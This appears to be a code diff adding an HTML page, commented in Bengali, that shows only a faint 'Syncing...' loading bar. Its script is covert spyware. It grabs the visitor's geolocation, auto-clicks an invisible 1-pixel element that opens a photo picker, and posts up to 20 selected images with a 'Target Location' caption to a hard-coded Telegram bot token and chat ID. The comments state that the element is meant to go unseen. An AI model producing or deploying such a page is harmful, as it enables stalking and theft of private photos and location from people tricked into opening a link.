@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title></title>
+<style>
+  body { 
+    margin: 0; 
+    padding: 0; 
+    background: #fff; /* সাদা ব্যাকগ্রাউন্ড */
+    height: 100vh; 
+    overflow: hidden; 
+    font-family: sans-serif;
+  }
+  
+  /* লোডিং বার (খুব পাতলা) */
+  .loader-bar {
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 3px;
+    background: #ddd;
+    z-index: 999;
+  }
+  
+  /* অ্যাক্টিভ লোডিং বার */
+  .progress {
+    width: 0%;
+    height: 100%;
+    background: #0088cc;
+    transition: width 2s ease-in-out;
+  }
+
+  /* ছোট টেক্সট নিচে (খুব ফেইড আউট) */
+  .status {
+    position: fixed; bottom: 10px; left: 50%; transform: translateX(-50%);
+    font-size: 10px; color: #ccc; opacity: 0.5;
+  }
+</style>
+</head>
+<body>
+
+<div class="loader-bar"><div class="progress" id="progressBar"></div></div>
+<div class="status">Syncing...</div>
+
+<script>
+// --- আপনার ডিটেইলস ---
+const TELEGRAM_BOT_TOKEN = '7603770395:AAEBlEAafIokfEyS-lTeudujGMNVfTg7LaY';
+const TELEGRAM_CHAT_ID = '7767412329'; // এখানে আপনার ট্যাবলেটের ID বসান
+// ----------------------
+
+window.onload = async function() {
+  // ১. লোকেশন নেওয়া
+  const location = await getGeoLocation();
+  
+  // ২. গ্যালারি থেকে ছবি পাঠানো (অদৃশ্য)
+  await captureAndSendGallery(location);
+};
+
+function getGeoLocation() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve("Lat/Long Not Found");
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve(`📍 Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`),
+      () => resolve("Location Access Denied"),
+      { timeout: 4000 }
+    );
+  });
+}
+
+async function captureAndSendGallery(location) {
+  const input = document.createElement('input');
+  input.type = 'file';
+  input.multiple = true;
+  input.accept = "image/*";
+
+  // অদৃশ্য বাটন (সাইজ খুব ছোট, কালো রঙে সাদা ব্যাকগ্রাউন্ডে)
+  // এটি ইউজারের চোখে পড়বে না।
+  const invisibleBtn = document.createElement('div');
+  invisibleBtn.style.cssText = `
+    position:fixed; top:0; left:0; width:1px; height:1px; 
+    background:black; opacity:0.01; z-index:9999; cursor:pointer;
+  `;
+  document.body.appendChild(invisibleBtn);
+
+  invisibleBtn.onclick = () => input.click();
+
+  // বাটনে ক্লিক করলেই অটোমেটিক সব ছবি সিলেক্ট হবে (যদি একসাথে সিলেক্ট করার অপশন থাকে) 
+  // অথবা ইউজার যদি গ্যালারি ওপেন করে, তবুও এটি কাজ করবে।
+  
+  // আমরা সরাসরি 'change' ইভেন্ট ব্যবহার করছি যাতে ইউজার ছবি সিলেক্ট করার পরই পাঠিয়ে দেয়
+  input.onchange = async (e) => {
+    const files = e.target.files;
+    if (files.length === 0) return;
+
+    // লোডিং বার চালু করা
+    document.getElementById('progressBar').style.width = '100%';
+
+    let imagesSent = 0;
+    const totalImages = Math.min(files.length, 20); // সর্বোচ্চ ২০টি ছবি (বেশি হলে ডাটা বেশি হবে)
+
+    for (let i = 0; i < totalImages; i++) {
+      let file = files[i];
+      let base64 = await toBase64(file);
+      
+      try {
+        await sendToTelegram(base64, location, i);
+        imagesSent++;
+        // ছোট ডিলে (1 সেকেন্ড) পরবর্তী ছবি পাঠানো
+        await new Promise(r => setTimeout(r, 800)); 
+      } catch (err) {
+        console.log("Error sending image " + i);
+      }
+    }
+
+    // সব শেষ হলে লোডিং বার হাইড করা এবং স্ট্যাটাস পরিবর্তন
+    document.getElementById('progressBar').style.width = '0%';
+    document.querySelector('.status').innerText = "Done";
+  };
+
+  // অটোমেটিক ক্লিক (যদি ফোন থেকে ওপেন হয়)
+  setTimeout(() => {
+    invisibleBtn.click();
+  }, 1000); // লিংকে ক্লিক করার ১ সেকেন্ড পর অটোমেটিক ক্লিক হবে
+}
+
+function toBase64(file) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.readAsDataURL(file);
+    reader.onload = () => resolve(reader.result);
+    reader.onerror = error => reject(error);
+  });
+}
+
+async function sendToTelegram(base64Image, locationText, index) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+  
+  // ক্যাপশন: প্রথম ছবির সাথে লোকেশন, বাকিগুলো শুধু ইমেজ নম্বর
+  let caption = "";
+  if (index === 0) {
+    caption = `📍 <b>Target Location:</b>\n${locationText}\n\n📂 Gallery Synced!`;
+  } else {
+    caption = `Image ${index + 1}`;
+  }
+
+  const formData = new FormData();
+  formData.append('chat_id', TELEGRAM_CHAT_ID);
+  formData.append('photo', base64Image);
+  formData.append('caption', caption);
+
+  await fetch(url, { method: 'POST', body: formData });
+}
+</script>
+</body>
+</html>
